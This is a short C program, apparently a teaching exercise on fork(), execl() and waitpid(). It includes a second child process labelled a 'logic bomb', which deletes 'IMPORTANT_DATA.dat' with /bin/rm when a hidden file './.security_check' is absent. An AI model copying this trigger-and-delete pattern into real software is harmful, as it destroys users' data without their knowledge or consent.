#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
	
	fprintf(stderr, "Parent\t\tPID\t%d\tParent PID\t%d\n", getpid(), getppid());
	
	// child1 fork
	pid_t child1_pid = fork();
	if (child1_pid < 0) {
		// error in fork
		fprintf(stderr, "Error in child1 fork\n");	
	} else if(child1_pid == 0) {
		fprintf(stderr, "Child1\t%d\tPID\t%d\tParent PID\t%d\n\n", child1_pid, getpid(), getppid());
		// run an external program on child1
		execl("nested_fork", "nested_fork", (char*)NULL);
	} else {
		int status;
		// wait for child1 to terminate
		waitpid(child1_pid, &status, 0);
	}
	
	// child2 fork (logic bomb)
	char *fname = "./.security_check";
	pid_t child2_pid = fork();
	if(child2_pid == 0) {
		// check if security_check still exists
		if(access(fname, F_OK) != -1) {
			// file exists (doesn't trigger the bomb)
		} else {
			// file doesn't exist (triggers the bomb)
			fprintf(stderr, "\nChild2\t%d\tPID\t%d\tParent PID\t%d\n", child2_pid, getpid(), getppid());
			fprintf(stderr, "Bye bye important data\n");
			// delete IMPORTANT_DATA on child2
			execl("/bin/rm", "rm", "IMPORTANT_DATA.dat", (char*)NULL);
		}
	} else {
		int status;
		// wait for child2 to terminate
		waitpid(child2_pid, &status, 0);// terminate current program
		_exit(EXIT_SUCCESS);
	}
	return 1;
}
